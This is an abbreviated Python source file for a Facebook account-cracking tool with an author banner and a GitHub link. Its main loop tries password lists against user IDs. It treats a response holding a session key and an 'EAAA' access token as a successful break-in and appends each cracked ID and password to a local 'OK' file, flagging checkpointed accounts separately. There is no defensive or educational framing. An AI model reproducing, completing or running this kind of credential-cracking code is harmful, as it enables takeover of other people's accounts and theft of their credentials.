...
class Main:
	def __init__(self):
		...
		time.sleep(4)
		os.system("clear")
		os.system("figlet hussnain")
		print("\n  ( Programmed By hussnain arshad )") 
		print("\n  ( Facebook : hussnain arshad )")  
		print(" ( https://github.com/Hussnainawan/hussnain.git )\n") 
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r [CRACK] %s/%s -> [hussnain-OK]:-%s - [hussnain-CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[hussnain-CP] %s • %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s • %s"%(uid, pw))
				open("OK-"+tgl+".txt","a").write("%s | %s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[hussnain-CP] %s • %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print(" [•] GITHUB : https://github.com/Hussnainawan/hussnain.git")
		exit()
	else:
		Main()
